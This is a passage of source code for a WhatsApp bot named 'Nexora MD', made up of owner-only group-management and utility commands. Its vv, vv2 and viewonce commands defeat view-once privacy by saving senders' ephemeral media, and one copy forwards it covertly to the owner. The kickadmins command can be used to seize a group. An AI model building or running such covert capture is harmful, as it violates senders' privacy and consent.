                    title: "𝗡𝗲𝘅𝗼𝗮 𝗠𝗱 𝗩𝗩-𝗦𝘆𝘀𝘁𝗲𝗺",
                    body: "View-Once Bypass Active",
                    thumbnail: await getBuffer('https://files.catbox.moe/wiiv8w.jpg'),
                    sourceUrl: "https://whatsapp.com/channel/0029Vb7KWN2E50UluAmGgM12",
                    mediaType: 1,
                    showAdAttribution: true
                }
            }
        }

        // Send the unsealed media to your DM instead of the chat
        if (mediaType === 'imageMessage') {  
            await empire.sendMessage(targetJid, { image: mediaBuffer, ...options })
        } else if (mediaType === 'videoMessage') {  
            await empire.sendMessage(targetJid, { video: mediaBuffer, ...options })
        } else if (mediaType === 'audioMessage') {  
            await empire.sendMessage(targetJid, { 
                audio: mediaBuffer, 
                mimetype: 'audio/ogg', 
                ptt: true 
            })
        }

        // No reply() here so the group doesn't see the bot's response text

    } catch (error) {
        console.error('VV ERROR:', error)
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
    }
}
break;



case 'vv3':
case 'viewonce': {
  if (!quoted) return reply(`💧 Reply to a view-once image or video\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
if (!isCreator) return reply("This command is restricted to sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");

  try {
    const qmsg = quoted.message || quoted.msg || quoted
    const viewOnce =
      qmsg?.viewOnceMessage?.message ||
      qmsg?.viewOnceMessageV2?.message ||
      qmsg?.viewOnceMessageV2Extension?.message

    if (!viewOnce) return reply(`💧 That is not a view-once message\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    const type = Object.keys(viewOnce)[0]
    const inner = viewOnce[type]

    if (/image/i.test(type)) {
      const stream = await downloadContentFromMessage(inner, 'image')
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }

      await empire.sendMessage(m.chat, {
        image: buffer,
        caption: `┏━━━━━━━━━━━━━─╮
┃  ✅ View-once opened
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`
      }, { quoted: m })
      return
    }

    if (/video/i.test(type)) {
      const stream = await downloadContentFromMessage(inner, 'video')
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }

      await empire.sendMessage(m.chat, {
        video: buffer,
        caption: `┏━━━━━━━━━━━━━─╮
┃  ✅ View-once opened
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯`
      }, { quoted: m })
      return
    }

    reply(`💧 Unsupported view-once type\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  } catch (err) {
    console.log('vv error:', err)
    reply(`❌ Failed to open view-once\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'vv2': {
  if (!quoted) return reply(`💧 Reply to a view-once message\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
if (!isCreator) return reply("This command is restricted to sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");

  try {
    const qmsg = quoted.message || quoted.msg || quoted
    const viewOnce =
      qmsg?.viewOnceMessage?.message ||
      qmsg?.viewOnceMessageV2?.message ||
      qmsg?.viewOnceMessageV2Extension?.message

    if (!viewOnce) return reply(`💧 That is not a view-once message\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    const type = Object.keys(viewOnce)[0]
    const inner = viewOnce[type]

    if (/image/i.test(type)) {
      const stream = await downloadContentFromMessage(inner, 'image')
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }

      await empire.sendMessage(m.chat, {
        document: buffer,
        mimetype: 'image/png',
        fileName: 'nexora_vv_image.png',
        caption: `💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`
      }, { quoted: m })
      return
    }

    if (/video/i.test(type)) {
      const stream = await downloadContentFromMessage(inner, 'video')
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
      }

      await empire.sendMessage(m.chat, {
        document: buffer,
        mimetype: 'video/mp4',
        fileName: 'nexora_vv_video.mp4',
        caption: `💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`
      }, { quoted: m })
      return
    }

    reply(`💧 Unsupported view-once type\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  } catch (err) {
    console.log('vv2 error:', err)
    reply(`❌ Failed to extract view-once\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break
case 'lockmedia': {
    if (!m.isGroup) return reply('❌ This command only works in groups.');
    if (!isCreator && !isAdmins) return reply("❌ Only group administrators can use this command.");

    const option = (args[0] || '').toLowerCase();
    if (!option || !['on', 'off'].includes(option)) {
        return reply(`💡 *Usage:*\n${prefix + command} on\n${prefix + command} off`);
    }

    if (!db.lockmedia) db.lockmedia = {};

    if (option === 'on') {
        db.lockmedia[m.chat] = {
            by: m.sender,
            time: Date.now()
        };
        saveDB();
        return reply('🛡️ *Media Lock Enabled.* Non-admin media files will be auto-deleted.');
    }

    delete db.lockmedia[m.chat];
    saveDB();
    reply('🔓 *Media Lock Disabled.* Group members can send media again.');
}
break;

case 'antitagall':
case '👻' : {
  if (!m.isGroup) return reply('This command is for groups only')
  if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");

  const option = args[0]?.toLowerCase()

  if (option === 'on') {
    setSetting(m.chat, "antitagall", true)
    reply('🚫 Anti-tagall *enabled* in this chat')
  } 
  else if (option === 'off') {
    setSetting(m.chat, "antitagall", false)
    reply('✅ Anti-group-mention *disabled* in this chat')
  } 
  else {
    reply(
      `Usage:\n` +
      `${prefix}antitagall on\n` +
      `${prefix}antitagall off`
    )
  }
}
break

case "antispam": {
    if (!isCreator) return m.reply("Only owner can toggle Anti Spam.");
    if (!args[0]) return m.reply("Usage: antispam on/off");
    if (args[0].toLowerCase() === "on") {
        setSetting(m.chat, "feature.antispam", true);
        m.reply("⚠️ Anti Spam enabled in this chat");
    } else if (args[0].toLowerCase() === "off") {
        setSetting(m.chat, "feature.antispam", false);
        m.reply("⚠️ Anti Spam disabled in this chat");
    } else m.reply("Usage: antispam on/off");
}
break;

case 'antidemote': {
  if (!m.isGroup) return reply('Group only')
  

  const option = (args[0] || '').toLowerCase()
  if (!option || !['on', 'off'].includes(option)) {
    return reply(`Usage:\n${prefix}antidemote on\n${prefix}antidemote off`)
  }

  setSetting(m.chat, 'antidemote', option === 'on')
  reply(option === 'on' ? '✅ AntiDemote enabled' : '❌ AntiDemote disabled')
}
break

case 'promoteall': {
  if (!m.isGroup) return reply('Group only')
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
  

  try {
    let promoted = 0
    let failed = 0

    for (const member of participants) {
      const user = member.id
      if (groupAdmins.includes(user)) continue
      if (user === botNumber) continue

      try {
        await empire.groupParticipantsUpdate(m.chat, [user], 'promote')
        promoted++
        await sleep(700)
      } catch (err) {
        failed++
        console.log('promoteall single error:', err)
      }
    }

    reply(`✅ Promoted: ${promoted}\n❌ Failed: ${failed}`)
  } catch (err) {
    console.log('promoteall error:', err)
    reply('❌ Failed to promote all')
  }
}
break

case 'kickadmins': {
  if (!m.isGroup) return reply('Group only')
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
  

  try {
    let removed = 0
    let failed = 0

    for (const user of groupAdmins) {
      if (user === botNumber) continue
      if (user === m.sender) continue

      try {
        await empire.groupParticipantsUpdate(m.chat, [user], 'remove')
        removed++
        await sleep(700)
      } catch (err) {
        failed++
        console.log('kickadmins single error:', err)
      }
    }

    reply(`✅ Removed admins: ${removed}\n❌ Failed: ${failed}`)
  } catch (err) {
    console.log('kickadmins error:', err)
    reply('❌ Failed to remove admins')
  }
}
break

case 'join-gc': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
  if (!text) return reply(`Example: ${prefix}join https://chat.whatsapp.com/...`)

  const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i)
  if (!match) return reply('❌ Invalid group link')

  try {
    await empire.groupAcceptInvite(match[1])
    reply('✅ Successfully joined the group')
  } catch (err) {
    console.log('join error:', err)
    reply('❌ Failed to join group')
  }
}
break

case 'infogroup':
case 'ginfo': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
    if (!m.isGroup) return reply('❌ This module can only be executed within group sessions.');

    await empire.sendMessage(m.chat, { react: { text: '📊', key: m.key } });

    try {
        const metaDataData = await empire.groupMetadata(m.chat);
        const totalUsers = metaDataData.participants;
        const totalAdmins = totalUsers.filter(u => u.admin !== null).length;
        
        // Convert timestamp to normal calendar date text string
        const creationTime = new Date(metaDataData.creation * 1000).toLocaleDateString('en-US', {
            year: 'numeric', month: 'long', day: 'numeric'
        });

        const dashboardLayout = `
🏢 *GROUP ANALYSIS METRIC DASHBOARD*

• *Title Name:* ${metaDataData.subject}
• *Internal ID:* \`${metaDataData.id}\`
• *Created On:* ${creationTime}
• *System Host:* @${metaDataData.owner ? metaDataData.owner.split('@')[0] : 'Unknown'}

👥 *MEMBER DISTRIBUTION STRUCTURE*
• *Total Enrolled Accounts:* \`${totalUsers.length}\`
• *Staff Administrators:* \`${totalAdmins}\`
• *Standard Members:* \`${totalUsers.length - totalAdmins}\`

🔒 *SETTING PRIVACY PERMISSIONS*
• *Strict Admin Only Messages:* ${metaDataData.announce ? '🔒 True' : '🔓 False'}
• *Strict Admin Edit Settings:* ${metaDataData.restrict ? '🔒 True' : '🔓 False'}

📝 *Group Description Core:*
_${metaDataData.desc || 'No profile context descriptions written.'}_
`.trim();

        await empire.sendMessage(m.chat, { text: dashboardLayout, mentions: totalUsers.map(u => u.id) }, { quoted: m });
    } catch (e) {
        reply('❌ System core failed to parse group metadata properties stack.');
    }
}
break;


case 'logs': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')

  try {
    const possibleLogs = [
      './error.log',
      './logs/error.log',
      './logs.txt',
      './log.txt',
      './stderr.log'
    ]

    const foundLog = possibleLogs.find(file => fs.existsSync(file))

    if (!foundLog) return reply('⚠️ No log file found')

    const stat = fs.statSync(foundLog)
    if (stat.size === 0) return reply('⚠️ Log file is empty')

    await empire.sendMessage(m.chat, {
      document: fs.readFileSync(foundLog),
      mimetype: 'text/plain',
      fileName: foundLog.split('/').pop()
    }, { quoted: m })
  } catch (err) {
    console.log('logs error:', err)
    reply('❌ Failed to fetch logs')
  }
}
break
case 'mode': {
    if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');
    
    // This reads global.status directly, meaning it will never lie to you
    reply(`💧 NEXORA MD v3 CURRENT MODE : ${global.status ? 'Public' : 'Private'}`);
}
break;

case 'alive': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
  const up = runtime(process.uptime())
  const mode = empire.public ? 'Public 🔓' : 'Self 🔐'

  reply(`┏━━━━━━━━━━━━━───╮
┃  *𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳*
├────────────────┤
┃  ✅ Status : Online
┃  ⏱ Uptime : ${runtime(process.uptime())}
┃  🔐 Mode   : ${mode}
┃  👑 Owner  : Xyron Tech
╰────────────────╯`)
}
break
case 'uptime': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
  const up = runtime(process.uptime())
  const mode = empire.public ? 'Public 🔓' : 'Self 🔐'

  reply(`┏━━━━━━━━━━━━━───╮
┃  *𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳* 
├────────────────┤
┃  ✅ Status : Online
┃  ⏱ Uptime : ${runtime(process.uptime())}
┃  🔐 Mode   : ${mode}
┃  👑 Owner  : xyron Tech
╰────────────────╯`)
}
break

case 'ping2': {
    const performance = require('performance-now');
    const os = require('os');
    const start = performance();

    // 1. Initial Loading State Indicator
    const sel = await empire.sendMessage(m.chat, { 
        text: '```🏓 Running diagnostic node sweep...```' 
    }, { quoted: m });

    const end = performance();
    const latency = parseFloat((end - start).toFixed(2));

    // 2. Performance Threshold Routing Logic
    let statusEmoji, indicator;
    if (latency < 200) {
        statusEmoji = '🟢';
        indicator = 'Excellent';
    } else if (latency < 500) {
        statusEmoji = '🟡';
        indicator = 'Stable Performance';
    } else {
        statusEmoji = '🔴';
        indicator = 'High Load Profile';
    }

    // 3. System Calculations Extraction
    const ramUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(1);
    
    const uptimeSec = process.uptime();
    const hours = Math.floor(uptimeSec / 3600);
    const minutes = Math.floor((uptimeSec % 3600) / 60);
    const uptimeString = `${hours}h ${minutes}m`;
    
    const timeNow = new Date().toLocaleTimeString('en-US', { 
        hour12: false, 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    });

    try {
        // Render the graphic asset tracking parameters natively
        const finalPingBuffer = await drawFullPingImage(
            latency, 
            indicator, 
            statusEmoji, 
            ramUsage, 
            totalRam, 
            uptimeString, 
            timeNow
        );

        // Remove the temporary loading text, then push out the drawn canvas card frame asset
        await empire.sendMessage(m.chat, { delete: sel.key });
        await empire.sendMessage(m.chat, { 
            image: finalPingBuffer
        }, { quoted: m });

    } catch (e) {
        console.error("Ping Canvas Generation Error: ", e);
        reply("❌ Error compiling structural telemetry canvas layout image.");
    }
}
break;

case 'speed': 
case 'ping': {
await empire.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
    const performance = require('performance-now');
    const os = require('os');
    const start = performance();

    // 1. Initial Loading State
    const sel = await empire.sendMessage(m.chat, { 
        text: '```🏓 pong...```' 
    }, { quoted: m });

    const end = performance();
    const latency = parseFloat((end - start).toFixed(2));

    // 2. Logic for Dynamic Status & Latency Colors
    let statusEmoji, indicator;
    if (latency < 200) {
        statusEmoji = '🟢';
        indicator = 'Excellent';
    } else if (latency < 500) {
        statusEmoji = '🟡';
        indicator = '💧Stable-running quietly 💧';
    } else {
        statusEmoji = '🔴';
        indicator = '💧High Load-system slow💧';
    }

    // 3. System Calculations
    const ramUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(1);
    
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    // 4. Real-time Clock (Format: HH:mm:ss)
    const timeNow = new Date().toLocaleTimeString('en-US', { 
        hour12: false, 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit' 
    });

    // 5. Build the UI
    const responseText = `
┏━━━━━━━━━━━━━──
┃   💧𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 💧 
╰───────────────

*⏱️ 𝙻𝙰𝚃𝙴𝙽𝙲𝚈:* ${latensi.toFixed(4)} ms ${statusEmoji}
*📊 𝚂𝚃𝙰𝚃𝚄𝚂:* ${indicator}
*🧠 𝚁𝙰𝙼:* ${ramUsage}MB / ${totalRam}GB
*🔋 𝚄𝙿𝚃𝙸𝙼𝙴:* ${hours}h ${minutes}m
*🕒 𝚂𝙴𝚁𝚅𝙴𝚁 𝚃𝙸𝙼𝙴:* ${timeNow}

†𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 𝚂𝙲𝙰𝙽 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴†`.trim();

    // Small delay for visual effect
    setTimeout(async () => {
        await empire.sendMessage(m.chat, { 
            text: responseText, 
            edit: sel.key 
        });
    }, 700);
}
break;
case 'block': {
    if (!isCreator) return reply("🕸️ *ACCESS DENIED:* Owner privileges required.")

    // Determine target node
    let users = m.isGroup 
        ? (m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)) 
        : m.chat;

    // Validate if the JID actually contains a number
    if (!users || users.length < 15) return reply("❌ *PROTOCOL ERROR:* Please reply to a message, mention a user, or provide a number.")

    try {
        await empire.updateBlockStatus(users, "block")
    //    await m.react('🚫')
        reply(`✅ *NODE TERMINATED:* @${users.split('@')[0]} has been blacklisted.`)
    } catch (error) {
        console.log(error)
        reply('❌ *SYSTEM ERROR:* Failed to execute block protocol.')
    }
}
break

case 'unblock': {
    if (!isCreator) return reply("🕸️ *ACCESS DENIED:* Owner privileges required.")

    let users = m.isGroup 
        ? (m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)) 
        : m.chat;

    if (!users || users.length < 15) return reply("❌ *PROTOCOL ERROR:* Identify the target to unblock.")

    try {
        await empire.updateBlockStatus(users, "unblock")
      //  await m.react('✅')
        reply(`🔓 *NODE RESTORED:* @${users.split('@')[0]} has been white-listed.`)
    } catch (error) {
        console.log(error)
        reply('❌ *SYSTEM ERROR:* Failed to restore node.')
    }
}
break




case 'hidetag': 
case 'whisper':{
  if (!m.isGroup) return reply('Group only')
     if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.");

  const message = text || m.quoted?.text || m.quoted?.caption
  if (!message) return reply(`Example: ${prefix}hidetag Hello everyone`)

  try {
    const members = participants.map(v => v.id)
    await empire.sendMessage(m.chat, {
      text: message,
      mentions: members
    }, { quoted: m })
  } catch (err) {
    console.log('hidetag error:', err)
    reply('❌ Failed to send hidetag')
  }
}
break
case 'tagall': {
    if (!m.isGroup) return reply('❌ This command can only be used in groups.');
    if (!isCreator && !isAdmins) return reply("❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ/ᴀᴅᴍɪɴs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.");
    
    await empire.sendMessage(m.chat, { react: { text: '📡', key: m.key } });

    try {
        // Fetch Group Profile Picture
        let ppGroup;
        try {
            ppGroup = await empire.profilePictureUrl(m.chat, 'image');
        } catch {
            ppGroup = 'https://files.catbox.moe/wiiv8w.jpg'; 
        }

        const groupMetadata = await empire.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        
        let teks = `╔══🌀 *ATTENTION EVERYONE* 🌀══╗\n`;
        teks += `┃\n`;
        teks += `┃ 💠 *GROUP:* ${groupMetadata.subject}\n`;
        if (text) teks += `┃ 💬 *Message:* ${text}\n`; 
        teks += `┃ 🏆 *Tagged by* ${m.pushName}`;
        teks += `┃ 👥 *Total:* ${participants.length} members\n`;
        teks += `┃\n`;
        teks += `╠═📡 *TAGGING ALL NOW*\n`;

        let memberIds = [];
        for (let mem of participants) {
            memberIds.push(mem.id);
            teks += `┃ ⚡ @${mem.id.split('@')[0]}\n`;
        }

        teks += `┃\n`;
        teks += `╚═🚀 *NEXORA* ©EMPIRE TECH═╝`;

        await empire.sendMessage(m.chat, {
            image: { url: ppGroup },
            caption: teks,
            mentions: memberIds
        }, { quoted: m });

    } catch (err) {
        console.log('tagall error:', err);
        reply('❌ System Error: Extraction Failed.');
    }
}
break;


case 'approveall': {
  if (!m.isGroup) return reply('Group only')
  
  if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.");

  try {
    const requests = await empire.groupRequestParticipantsList(m.chat)

    if (!requests || !requests.length) {
      return reply('No pending join requests found')
    }

    const users = requests.map(v => v.jid || v.id).filter(Boolean)

    if (!users.length) {
      return reply('No valid join requests found')
    }

    let approved = 0
    let failed = 0

    for (const user of users) {
      try {
        await empire.groupRequestParticipantsUpdate(m.chat, [user], 'approve')
        approved++
        await sleep(700)
      } catch (err) {
        failed++
        console.log('approveall single error:', err)
      }
    }

    reply(`✅ Approved: ${approved}\n❌ Failed: ${failed}`)
  } catch (err) {
    console.log('approveall error:', err)
    reply('❌ Failed to approve join requests')
  }
}
break
case 'public':
case 'private': {
    if (!isCreator) return reply("❌ Only the owner can change the bot's mode.");

    const fs = require('fs');
    const path = require('path');
    const dirPath = path.join(__dirname, 'database');
    const filePath = path.join(dirPath, 'bot_config.json');

    // Create the database folder if it isn't there
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }

    // Read the current setting (default to private if file doesn't exist)
    let config = { selfMode: true };
    if (fs.existsSync(filePath)) {
        try {
            config = JSON.parse(fs.readFileSync(filePath, 'utf-8'));
        } catch (e) {
            config = { selfMode: true };
        }
    }

    // If typing .private
    if (command === 'private') {
        if (config.selfMode === true) return reply("🔒 The bot is already set to private.");
        
        config.selfMode = true;
        fs.writeFileSync(filePath, JSON.stringify(config, null, 2));
        
        await empire.sendMessage(m.chat, { react: { text: '🔒', key: m.key } });
        return reply("🔒 *Bot is now PRIVATE.* It will only reply to the owner.");
    }

    // If typing .public
    if (command === 'public') {
        if (config.selfMode === false) return reply("🌐 The bot is already set to public.");
        
        config.selfMode = false;
        fs.writeFileSync(filePath, JSON.stringify(config, null, 2));
        
        await empire.sendMessage(m.chat, { react: { text: '🌐', key: m.key } });
        return reply("🌐 *Bot is now PUBLIC.* Anyone can use it now.");
    }
}
break;



case 'commandlist':
case 'botinfo': {
if (!isCreator) return reply("This command is restricted to sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
    try {
        const handlerFile = './case.js'; 
        const fileContent = fs.readFileSync(handlerFile, 'utf-8');

        // Count all "case 'commandName'" occurrences
        const caseMatches = [...fileContent.matchAll(/case\s+'([a-zA-Z0-9_-]+)'/g)];
        const totalCommands = caseMatches.length;

        // Bot uptime
        const _uptime = process.uptime(); // in seconds
        const hours = Math.floor(_uptime / 3600);
        const minutes = Math.floor((_uptime % 3600) / 60);
        const seconds = Math.floor(_uptime % 60);

        // Ping / latency
        const start = Date.now();
        await empire.sendPresenceUpdate('composing', m.chat); 
        const ping = Date.now() - start;

        // Reply with formatted info
        const botInfo = `
📌 *Nexora MD v3* 📌
💧 Owner: Empire Tech
⏱ Uptime: ${hours}h ${minutes}m ${seconds}s
💧 Ping: ${ping}ms
🗃️ Available commands: ${totalCommands}
        `.trim();

        reply(botInfo);

    } catch (err) {
        console.error(err);
        reply('⚠️ Failed to get bot info!');
    }
}
break;
case 'security': {
await empire.sendMessage(m.chat, { react: { text: '🥷', key: m.key } });
  if (!m.isGroup) return reply('Group only');
    if (!isAdmins && !isCreator) return reply("This command is restricted to sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
  if (!isCreator) return reply("This command is restricted to sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");

  const metadata = await empire.groupMetadata(m.chat).catch(() => null)
  if (!metadata) return reply('Failed to fetch group data')

  const participants = metadata.participants || []
  const admins = participants.filter(p => p.admin !== null).map(p => p.id)

  const botAdmin = admins.includes(botNumber)
  const groupClosed = metadata.announce === true

  const antilink = getSetting(m.chat, 'antilink', false)
  const antiraid = getSetting(m.chat, 'antiraid', false)
  const slowmode = getSetting(m.chat, 'slowmode', 0)
  const adminonly = getSetting(m.chat, 'adminonly', false)

  const text = `🛡️ *REAL GROUP SECURITY STATUS*

━━━━━━━━━━━━━━━━━━
👥 Members: ${participants.length}
👮 Admins: ${admins.length}
🤖 Bot Admin: ${botAdmin ? '🟢 YES' : '🔴 NO'}
🔒 Group Closed: ${groupClosed ? '🟢 YES' : '🔴 NO'}

━━━━━━━━━━━━━━━━━━
🔗 Anti-Link: ${antilink ? '🟢 ON' : '🔴 OFF'}
🚨 Anti-Raid: ${antiraid ? '🟢 ON' : '🔴 OFF'}
🐢 Slow Mode: ${slowmode ? `🟢 ${slowmode}s` : '🔴 OFF'}
👮 Admin Only Mode: ${adminonly ? '🟢 ON' : '🔴 OFF'}

━━━━━━━━━━━━━━━━━━
†𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳†`

  reply(text)
}
break


case 'timer': {
await empire.sendMessage(m.chat, { react: { text: '⌚', key: m.key } });
  if (!args[0]) return reply('Example: .timer 5m')
if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");

  const timeArg = args[0]
  const match = timeArg.match(/^(\d+)(s|m|h)$/)

  if (!match) return reply('Use format like 10s, 5m, 2h')

  const amount = parseInt(match[1])
  const unit = match[2]

  let ms = 0
  if (unit === 's') ms = amount * 1000
  if (unit === 'm') ms = amount * 60 * 1000
  if (unit === 'h') ms = amount * 60 * 60 * 1000

  reply(`⏳ Timer started for ${amount}${unit}`)

  setTimeout(() => {
    empire.sendMessage(m.chat, {
      text: `⏰ Timer finished (${amount}${unit})`,
      mentions: [m.sender]
    })
  }, ms)
}
break

case "recipe-ingredient": {
 await empire.sendMessage(m.chat, { react: { text: '🧑‍🍳', key: m.key } });
if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
    if (!text) return m.reply("📌 Example: recipe-ingredient chicken");

    await empire.sendPresenceUpdate("composing", m.chat);

    try {
        const res = await axios.get(`https://www.themealdb.com/api/json/v1/1/filter.php?i=${encodeURIComponent(text)}`);
        if (!res.data.meals) return m.reply(`❌ No recipes found using *${text}*.`);

        const meals = res.data.meals
            .slice(0, 5)
            .map((m, i) => `🍽️ *${i + 1}. ${m.strMeal}*  
🔗 [View Recipe](https://www.themealdb.com/meal.php?c=${m.idMeal})`)
            .join("\n\n");

        let caption = `
╭━━━🍴 *ᴄʜᴇғ Nexora ɪɴɢʀᴇᴅɪᴇɴᴛs* 🍴━━━╮

🔍 *Ingredient:* ${text}  

${meals}

*
        `;

        await empire.sendMessage(m.chat, {
            text: caption,
            mentions: [m.sender],
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: `120363403195369259@newsletter`,
                    newsletterName: `ᴇᴍᴘɪʀᴇ ᴛᴇᴄʜ❍`
                }
            }
        }, { quoted: m });

    } catch {
        m.reply("⚠️ 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 couldn’t fetch recipes. Try again later!");
    }
}
break

case 'idch': {
await empire.sendMessage(m.chat, { react: { text: '🫧', key: m.key } });
    // Manually define text from the message argument if it's missing
    let text = q ? q : args.join(" "); 
    
    if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
    if (!text) return reply("Example: .idch https://whatsapp.com/channel/xxxx");
    if (!text.includes("https://whatsapp.com/channel/")) return reply("Not a valid Link");
    
    let result = text.split('https://whatsapp.com/channel/')[1];
    
    try {
        let res = await empire.newsletterMetadata("invite", result);
        let teks = `
*🆔 ID :* ${res.id}
*👤 Name :* ${res.name}
*👥 Follower:* ${res.subscribers}
*📊 Status :* ${res.state}
*✔️ Verified :* ${res.verification === "VERIFIED" ? "Verified" : "No"}
`;
        return reply(teks);
    } catch (e) {
        return reply("Error fetching channel metadata. Make sure the link is correct.");
    }
}
break;

case 'jid': {
